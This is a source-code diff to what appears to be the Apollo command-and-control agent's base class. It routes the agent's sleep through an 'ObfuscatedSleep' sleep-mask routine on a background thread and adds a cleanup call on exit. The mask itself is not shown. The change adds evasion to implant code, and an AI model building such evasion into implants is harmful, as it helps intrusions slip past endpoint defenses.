@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Threading;
+using ApolloInterop.Classes.Core;
 using ApolloInterop.Features.KerberosTickets;
 using ApolloInterop.Interfaces;
 
@@ -43,7 +44,12 @@ namespace ApolloInterop.Classes
         }
 
         public abstract void Start();
-        public virtual void Exit() { Alive = false; _exit.Set(); }
+        public virtual void Exit()
+        {
+            Alive = false;
+            _exit.Set();
+            SleepMask.Cleanup();
+        }
         public virtual void SetSleep(int seconds, double jitter=0)
         {
             SleepInterval = seconds * 1000;
@@ -68,6 +74,7 @@ namespace ApolloInterop.Classes
                 int maxSleep = (int)(SleepInterval * (Jitter + 1));
                 sleepTime = (int)(random.NextDouble() * (maxSleep - minSleep) + minSleep);
             }
+
             WaitHandle[] sleepers = _agentSleepHandles;
             if (handles != null)
             {
@@ -76,7 +83,34 @@ namespace ApolloInterop.Classes
                 Array.Copy(sleepers, 0, tmp, handles.Length, sleepers.Length);
                 sleepers = tmp;
             }
-            WaitHandle.WaitAny(sleepers, sleepTime);
+
+            if (sleepTime > 0 && SleepMask.IsAvailable)
+            {
+                ManualResetEvent maskDone = new ManualResetEvent(false);
+                Thread maskThread = new Thread(() =>
+                {
+                    try
+                    {
+                        SleepMask.ObfuscatedSleep((uint)sleepTime);
+                    }
+                    catch { }
+                    finally
+                    {
+                        maskDone.Set();
+                    }
+                });
+                maskThread.IsBackground = true;
+                maskThread.Start();
+
+                WaitHandle[] combined = new WaitHandle[sleepers.Length + 1];
+                combined[0] = maskDone;
+                Array.Copy(sleepers, 0, combined, 1, sleepers.Length);
+                WaitHandle.WaitAny(combined);
+            }
+            else
+            {
+                WaitHandle.WaitAny(sleepers, sleepTime);
+            }
         }
 
         public void AcquireOutputLock()
